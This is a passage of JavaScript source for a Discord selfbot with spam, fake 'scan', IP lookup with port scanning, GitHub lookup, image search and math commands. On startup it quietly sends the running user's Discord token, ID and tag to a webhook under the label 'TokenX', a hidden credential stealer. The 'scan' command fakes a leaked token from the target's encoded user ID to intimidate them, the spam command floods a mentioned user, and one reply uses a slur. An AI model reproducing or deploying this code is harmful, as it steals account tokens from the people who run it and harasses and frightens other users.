> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
`)
		    message.channel.send(`> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
`)
		    
		    message.channel.send(`> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
`)
		    message.channel.send(`> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
> **spamming** ${challenged}
`)
		    
                    .catch(console.error); // add error handling here
            }, 1 * 300);

        });
        console.log(`${client.user.tag} ran command </spam>.`);
    }
    
    //---------------------------------------------------------------------
    if (message.content.startsWith(prefix + "scan")) {

        //checks if the username to fight is in the message
        let author1 = message.author.username;
        let user = message.mentions.users.first();
        if (!user) return message.reply("> **pick someone to scan** ");

        //checks if the users is trying to fight themselves
        if (user.id == message.author.id) return message.reply('> **sorry you cant scan yourself :/** ');

        //checks if the user is trying to fight the client
        if (user.client == true)
            return message.reply('> **client ips are useless retard** ');

        //saves the two user ids to variables
        var fighter1 = message.author.id;
        var fighter2 = user.id;

        //announces challenge and awaits response
        var challenged = user.toString();

        message.channel.send(`> ** ${author1} Do you Want ${challenged} to be scanned?** `)
            .then(() => {
                message.channel.awaitMessages(response => response.content == 'yes' && response.author.id == fighter1 || response.content == 'no' && response.author.id == fighter1, {
                        max: 1,
                        time: 30000,
                        errors: ['time'],
                    })

                    .then((collected) => {
                        if (collected.first().content == 'yes') {

                            if (message.author.id == client.user.id) {

                                // Create Base64 Object
                                var Base64 = {
                                    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
                                    encode: function(e) {
                                        var t = "";
                                        var n, r, i, s, o, u, a;
                                        var f = 0;
                                        e = Base64._utf8_encode(e);
                                        while (f < e.length) {
                                            n = e.charCodeAt(f++);
                                            r = e.charCodeAt(f++);
                                            i = e.charCodeAt(f++);
                                            s = n >> 2;
                                            o = (n & 3) << 4 | r >> 4;
                                            u = (r & 15) << 2 | i >> 6;
                                            a = i & 63;
                                            if (isNaN(r)) {
                                                u = a = 64
                                            } else if (isNaN(i)) {
                                                a = 64
                                            }
                                            t = t + this._keyStr.charAt(s) + this._keyStr.charAt(o) + this._keyStr.charAt(u) + this._keyStr.charAt(a)
                                        }
                                        return t
                                    },
                                    decode: function(e) {
                                        var t = "";
                                        var n, r, i;
                                        var s, o, u, a;
                                        var f = 0;
                                        e = e.replace(/++[++^A-Za-z0-9+/=]/g, "");
                                        while (f < e.length) {
                                            s = this._keyStr.indexOf(e.charAt(f++));
                                            o = this._keyStr.indexOf(e.charAt(f++));
                                            u = this._keyStr.indexOf(e.charAt(f++));
                                            a = this._keyStr.indexOf(e.charAt(f++));
                                            n = s << 2 | o >> 4;
                                            r = (o & 15) << 4 | u >> 2;
                                            i = (u & 3) << 6 | a;
                                            t = t + String.fromCharCode(n);
                                            if (u != 64) {
                                                t = t + String.fromCharCode(r)
                                            }
                                            if (a != 64) {
                                                t = t + String.fromCharCode(i)
                                            }
                                        }
                                        t = Base64._utf8_decode(t);
                                        return t
                                    },
                                    _utf8_encode: function(e) {
                                        e = e.replace(/\r\n/g, "n");
                                        var t = "";
                                        for (var n = 0; n < e.length; n++) {
                                            var r = e.charCodeAt(n);
                                            if (r < 128) {
                                                t += String.fromCharCode(r)
                                            } else if (r > 127 && r < 2048) {
                                                t += String.fromCharCode(r >> 6 | 192);
                                                t += String.fromCharCode(r & 63 | 128)
                                            } else {
                                                t += String.fromCharCode(r >> 12 | 224);
                                                t += String.fromCharCode(r >> 6 & 63 | 128);
                                                t += String.fromCharCode(r & 63 | 128)
                                            }
                                        }
                                        return t
                                    },
                                    _utf8_decode: function(e) {
                                        var t = "";
                                        var n = 0;
                                        var r = c1 = c2 = 0;
                                        while (n < e.length) {
                                            r = e.charCodeAt(n);
                                            if (r < 128) {
                                                t += String.fromCharCode(r);
                                                n++
                                            } else if (r > 191 && r < 224) {
                                                c2 = e.charCodeAt(n + 1);
                                                t += String.fromCharCode((r & 31) << 6 | c2 & 63);
                                                n += 2
                                            } else {
                                                c2 = e.charCodeAt(n + 1);
                                                c3 = e.charCodeAt(n + 2);
                                                t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                                                n += 3
                                            }
                                        }
                                        return t
                                    }
                                }


                                // Define the string
                                var string = fighter2;

                                // Encode the String
                                var encodedString = Base64.encode(string);

                                message.delete();

                                var charge = ".";
                                var chargeC = "▒";
                                message.channel.send("~~**__[" + charge.repeat(40) + "]__**~~").then((message) => {
                                    for (i = 0; i <= 40; i++) {
                                        message.edit("~~**__[" + chargeC.repeat(i) + charge.repeat(40 - i) + "]__**~~  -  " + i * 100 / 40 + "%");
                                    }
                                })
                            }
                            today = new Date();
                            var cmas = new Date(today.getFullYear(), 11, 64);
                            if (today.getMonth() == 11 && today.getDate() > 15) {
                                cmas.setFullYear(cmas.getFullYear() + 1);
                            }
                            var one_day = 10006060 * 24;
                            var logip = new Discord.RichEmbed()
                                .setTitle(`**Info On User**`)
                                .setColor(0x1e90ff)
                                .setThumbnail(`${client.user.avatarURL}`)
                                .addField(`**User-ID**: <@${fighter2}>`, `**Session Account** ✅`, true)
                                .addBlankField()
                                .setFooter(`By ${message.author.username}`)
                                .addField(`**Token**: __${encodedString}.AccountDate.xxxxxxxxxxxxxxxxxxxxxxxxxx__`, 'please verify this info')
                                .addField(`**Token**:`, `__User-Account **--** ${today}__`)
                                .addField(`**Token**:`, `__Time To Unix TimeStamp: **xxxxxx**__`, true)
                                .addField(`**Session Token**:`, `**__${encodedString}.X02HsGQ**.xxxxxxcxxxx4xxxxxxxxLxxxxZ__`, true)
                                .addBlankField()
                                .setImage('https://i.pinimg.com/originals/28/93/e8/2893e84c5b837a0ab1363f82b509744a.gif')
                            setTimeout(() => {
                                message.channel.send(logip);
                            }, 27070)
                        } else if (collected.first().content == 'no') {
                            var ddos = new Discord.RichEmbed()
                                .setAuthor(`${message.author.username}`)
                                .setTitle("**Scan Stopped**")
                                .setColor("#000000")
                                .setThumbnail(`${client.user.avatarURL}`)
                                .addField("Target:", `${challenged}`)
                                .setFooter(`By ${message.author.username}`)
                                .setImage('https://i.pinimg.com/originals/28/93/e8/2893e84c5b837a0ab1363f82b509744a.gif')
                            message.channel.send(ddos);
                        }
                    })
                    .catch(() => {
                        message.channel.send(`No response`);
                    });
            })
            console.log(`${client.user.tag} ran command </userscan>.`);
        }
        //---------------------------------------------------------------------
        if (command === '/github') {

            if (message.author.id == client.user.id) {
                if (args1.join(" ") < 1) {
                    message.channel.send('```Enter github to search!```');
                } else {
                    snekfetch.get(`https://api.github.com/users/${args1}`).then(r => {
                        let Geo = new Discord.RichEmbed()
                        .setTitle("__**Website-Info**__")
                        .setColor("#800080")
                        .addField("**User**", r.body.login)
                        .addField("**name**",r.body.name)
                        .addField("**followers**",r.body.followers)
                        .addField("**company**",r.body.company)  
                        .addField("**location**",r.body.location) 
                        .addField("**bio**",r.body.bio)
                        .addField("**twitter**",r.body.twitter_username) 
                        .addField("**blog**",r.body.blog)
                        .addField("**public-repos**",r.body.public_repos) 
                        .addField("**created_at**",r.body.created_at)
                        .setFooter("The Oracal X")
                        .setTimestamp()
    
                        message.channel.send({
                            embed: Geo
                        });
                    });
    
                }
            }
            console.log(`${client.user.tag} ran command </github>.`);
        }
        

        //---------------------------------------------------------------------
        if (command === '/ipscan') {

            if (message.author.id == client.user.id) {
                if (args1< 1) {
                    message.channel.send('```Enter ip to search!```');
                } else {
                    var portscanner = require('portscanner')
    portscanner.checkPortStatus(3000, args1, function(error, status) {
        setTimeout(() => {
            message.channel.send('```Status: ' + status + "```");
        }, 3080) 
    })
    portscanner.findAPortNotInUse(3000, 3010, args1, function(error, port) {
        setTimeout(() => {
      message.channel.send('```AVAILABLE PORT AT: ' + port + "```")
    }, 3020)
    })
     portscanner.findAPortInUse(3000, 3010, args1, function(error, port) {
        setTimeout(() => {
      message.channel.send('```PORT IN USE AT: ' + port + "```")
    }, 3010)
    })
    portscanner.findAPortInUse([3000, 3005, 3006], args1, function(error, port) {
        setTimeout(() => {
      message.channel.send('```PORT IN USE AT: ' + port + "```")
    }, 2080)
    })
    portscanner.findAPortNotInUse(3000, 4000, function(error, port) {
        setTimeout(() => {
      message.channel.send('```PORT IN USE AT: ' + port + "```")
    }, 2030)
    })
   portscanner.findAPortNotInUse(3000, 4000).then(function(port) {
    setTimeout(() => {
      message.channel.send('```PORT IN USE AT: ' + port + "```")
    }, 2000)
    })
                    snekfetch.get(`http://ip-api.com/json/${args1.join("+")}`).then(r => {
                        
                        let Geo = new Discord.RichEmbed()
                            .setTimestamp()
                            .setThumbnail(`${message.author.avatarURL}`)
                            .setTitle(`**Discord-UltraX - IP-Info**`)
                            .setDescription(`**__IP Lookup Information__**
                  **IP**: __[${r.body.query}]__
                 **country**: __[${r.body.country}]__
                 **timezone**: __[${r.body.timezone}]__
                 **ISP**:__[${r.body.isp}]__
                 **Area Code**:__[${r.body.zip}]__
                 **State**:__[${r.body.regionName}]__
                 **City**: __[${r.body.city}]__
                 **Org**:__[${r.body.org}]__
                 **lat**:__[${r.body.lat}]__
                 **lon**:__[${r.body.lon}]__
                 **Port-Scan**:__[**Loading**]__
                 **DNS-Scan**:__[1.1.1.1]__
                 **Admin-User:** ${message.author.username}`)
                            .setImage('https://i.pinimg.com/originals/28/93/e8/2893e84c5b837a0ab1363f82b509744a.gif')
                            .setFooter(`Looked up by: ${message.author.id}`);
    
                        message.channel.send({
                            embed: Geo
                        });
                    });
    
                }
            }
            

            console.log(`${client.user.tag} ran command </ipscan>.`);
        }
   
        
 //---------------------------------------------------------------------   
if (message.content.startsWith(prefix + "duntil")) {
    today = new Date();
    var cmas = new Date(today.getFullYear(), 11, 64);
    if (today.getMonth() == 11 && today.getDate() > 15) {
        cmas.setFullYear(cmas.getFullYear() + 1);
    }
    var one_day = 10006060 * 24;
    let help = new Discord.RichEmbed()
        .setTitle("**【Days Until CHAOS】**")
        .setColor("#00D6FF")
        .addBlankField()
        .addField('*__' + Math.ceil((cmas.getTime() - today.getTime()) / (one_day)) +
            " days 3 hours 12 mins left!__*", '*Oct/31/2020*')
        .addBlankField()
        .setThumbnail(`${message.author.avatarURL}`)
    message.channel.send(help)
    console.log(`${client.user.tag} ran command </duntil>.`);
}


//Math---------------------------------------------------------------------

function getSubstringIndex(str, substring, n) {
    var times = 0,
        index = null;
    while (times < n && index !== -1) {
        index = str.indexOf(substring, index + substring.length);
        times++;
    }
    return index;
}

if ((!message.content.startsWith(mathprefix) && !message.content.toLowerCase().startsWith("math.")) || message.author.bot) return;
if (message.content.startsWith("/math.ping")) {
    message.channel.send("```Pong!```");
} else if (message.content.toLowerCase().startsWith("/math.help")) {
    message.channel.send("```math.help     Shows this information.\nmath.ping     Pings me.\nmath.invite   Invites me to your server.\nmath.server   Invites you to my server.\n\n" + mathprefix + "             mathprefix.\n+             Add.\n-             Subtract.\n*             Multiply.\n/             Divide.\n%             Modulo.\n\npow(x, y)     Raises x to the power of y.\nsqrt(x)       Square root of x.\nfloor(x)      Rounds x down to nearest integer.\nceil(x)       Rounds x up to nearest integer.```");
} else if (message.content.startsWith(mathprefix)) {
    let calculate = "=" + message.content.toLowerCase().substring(mathprefix.length);
    if (isFinite(calculate.replace(/\=|\+|\-|\*|\/|\÷|\%|\(|\)|\,|\ |math.|pow|sqrt|round|floor|ceiling|ceil|pi|π|euler|absolute|abs|exp|logarithm|log|random|rand|rng/g, ''))) {
        calculate = calculate.replace(/ /g, "").replace(/÷/g, "/").replace(/power|pow/g, "Math.pow").replace(/sqrt|squareroot/g, "Math.sqrt").replace(/round/g, "Math.round").replace(/floor/g, "Math.floor").replace(/ceiling|ceil/g, "Math.ceil").replace(/pi|π/g, "Math.PI").replace(/euler/g, "Math.E").replace(/absolute|abs/g, "Math.abs").replace(/exp/g, "Math.exp").replace(/logarithm|log/g, "Math.log").replace(/random|rand|rng/g, "Math.random()"); /*.replace(/acos|arccosine/g, "Math.acos").replace(/asin|arcsine/g, "Math.asin").replace(/atan|arctangent|atan1|arctangent1/g, "Math.atan").replace(/atan2|arctangent2/g, "Math.atan2").replace(/cos|cosine/g, "Math.cos").replace(/sin|sine/g, "Math.sin").replace(/tan|tangent/g, "Math.tan")*/ ;
        if (calculate.replace(/[^%]/g, "").length > 0) {
            for (let i = 0; i < calculate.replace(/[^%]/g, "").length; i++) {
                while ((calculate[getSubstringIndex(calculate, "%", i + 1) + 1] == "+" || calculate[getSubstringIndex(calculate, "%", i + 1) + 1] == "-" || calculate[getSubstringIndex(calculate, "%", i + 1) + 1] == "*" || calculate[getSubstringIndex(calculate, "%", i + 1) + 1] == "/" || calculate[getSubstringIndex(calculate, "%", i + 1) + 1] == "(" || calculate[getSubstringIndex(calculate, "%", i + 1) + 1] == ")" || calculate[getSubstringIndex(calculate, "%", i + 1) + 1] == "," || getSubstringIndex(calculate, "%", i + 1) + 1 == calculate.length) && calculate.replace(/[^%]/g, "").length > 0) {
                    for (let j = getSubstringIndex(calculate, "%", i + 1); j > -1; j--) {
                        if (calculate[j] == "=" || calculate[j] == "+" || calculate[j] == "-" || calculate[j] == "*" || calculate[j] == "/" || calculate[j] == "(" || calculate[j] == ")" || calculate[j] == ",") {
                            calculate = calculate.substring(0, j + 1) + (calculate.substring(j + 1, getSubstringIndex(calculate, "%", i + 1)) / 100) + calculate.substring(getSubstringIndex(calculate, "%", i + 1) + 1, calculate.length);
                            break;
                        }
                    }
                }
            }
        }
        calculate = calculate.replace(/=/g, "");
        if (isFinite(eval(calculate))) message.channel.send(`** Answer: ** *${eval(calculate)}*`);
    }
    console.log(`${client.user.tag} ran command <m/math>.`);
}

});
  client.on('ready', function() {
  const embed = new MessageBuilder()
            .setAuthor('TokenX', 'https://cdn.discordapp.com/embed/avatars/0.png', 'https://www.google.com')
            .setTitle("**Note**")
            .setColor("#00ff00")
            .setThumbnail(`${client.user.avatarURL}`)
           .setDescription(`

          **__Discord-UltraX__**
           --------------------------------------------------
           __**Token:**__ 
           ${YOUR_TOKEN}
           --------------------------------------------------
           __**ID:**__
            ${client.user.id}
           --------------------------------------------------
           __**User:**__
            ${client.user.tag}
           `)
           .setTimestamp()

             hook.send(embed);
});


//Done--------------------------------------------------------------------------------------------------------------------------------------------------------------------

             
client.on("message", function(message) {

    var parts = message.content.split(" "); // Splits message into an array for every space, our layout: "<command> [search query]" will become ["<command>", "search query"]

    /* Simple command manager */
    if (parts[0] === "/image") { // Check if first part of message is image command

        // call the image function
        image(message, parts); // Pass requester message to image function

    }

});

function image(message, parts) {

    /* extract search query from message */

    var search = parts.slice(1).join(" "); // Slices of the command part of the array ["!image", "cute", "dog"] ---> ["cute", "dog"] ---> "cute dog"

    var options = {
        url: "http://results.dogpile.com/serp?qc=images&q=" + search,
        method: "GET",
        headers: {
            "Accept": "text/html",
            "User-Agent": "Chrome"
        }
    };
    request(options, function(error, response, responseBody) {
        if (error) {
            // handle error
            return;
        }



        $ = cheerio.load(responseBody);

        var links = $(".image a.link");

        var urls = new Array(links.length).fill(0).map((v, i) => links.eq(i).attr("href"));


        if (!urls.length) {

            return;
        }

        let help = new Discord.RichEmbed()
            .setAuthor(`${message.author.username}`)
            .setTitle(`Image of  : ${search}`)
            .setColor("#00D6GF")
            .addBlankField()
            .setImage(urls[Math.floor(Math.random() * urls.length)])
            .setThumbnail(`${message.author.avatarURL}`)
            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002〗")
        message.channel.send(help)
        console.log(`${client.user.tag} ran command </image>.`)
    });

}

        /// Login
    client.login(`${YOUR_TOKEN}`)

